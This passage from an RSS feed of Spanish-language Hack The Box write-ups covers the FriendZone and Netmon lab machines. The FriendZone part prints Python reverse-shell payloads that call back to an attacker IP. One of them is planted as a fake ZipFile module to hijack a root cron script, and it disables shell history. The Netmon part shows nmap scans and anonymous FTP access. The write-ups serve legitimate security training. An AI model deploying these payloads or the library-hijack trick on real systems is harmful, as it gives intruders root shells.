&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;subprocess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AF_INET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;10.10.15.126&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7878&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileno&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileno&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileno&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;subprocess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;

&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pty&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;socket&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;lhost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.10.15.126&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;lport&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7878&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;ZIP_DEFLATED&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;ZipFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AF_INET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lhost&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileno&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileno&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileno&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;putenv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HISTFILE&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/dev/null&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;pty&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;spawn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_222935.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Como podemos ver en el script se ejecuta cada medio minuto por lo cual obtendremos una shell inversa como usuario root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_222649.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/friendzone/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/friendzone/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Netmon</title>
        <link>https://sckull.github.io/posts/netmon/</link>
        <pubDate>Sat, 29 Jun 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 29 Jun 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/netmon/</guid>
        <description>Netmon es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Netmon es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Netmon&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.152&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/2984&#34;&gt;mrb3n&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Al realizar un escaneo con nmap nos muestra servicios ftp, http y puertos de windows.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~# nmap -sT -p- --min-rate &lt;span class=&#34;m&#34;&gt;5000&lt;/span&gt; 10.10.10.152 -o tcp
Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-03-06 18:59 GMT
Warning: 10.10.10.152 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.152
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;32841&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;32683&lt;/span&gt; filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
50315/tcp open  unknown

Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 169.37 seconds

root@sckull:~# nmap -sC -p 21,80,135,139,445 -o nmap-ports.scan 10.10.10.152
Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-03-06 19:03 GMT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.152
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE
21/tcp  open  ftp
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-anon: Anonymous FTP login allowed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 02-02-19  11:18PM                 &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; .rnd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 02-25-19  09:15PM       &amp;lt;DIR&amp;gt;          inetpub
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 02-25-19  09:56PM       &amp;lt;DIR&amp;gt;          Program Files
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 02-02-19  11:28PM       &amp;lt;DIR&amp;gt;          Program Files &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;x86&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 02-03-19  07:08AM       &amp;lt;DIR&amp;gt;          Users
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_02-25-19  10:49PM       &amp;lt;DIR&amp;gt;          Windows
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-syst: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  SYST: Windows_NT
80/tcp  open  http
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-title: Welcome &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; PRTG Network Monitor &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NETMON&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Requested resource was /index.htm
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 48s, deviation: 0s, median: 47s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: guest
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: disabled &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2019-03-06 19:03:57
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2019-03-06 18:58:01

Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 10.87 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp---puerto-21&#34;&gt;FTP - Puerto 21&lt;/h2&gt;
&lt;p&gt;Con las credenciales anonymous:anonymous obtenemos acceso y tambien la bandera &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
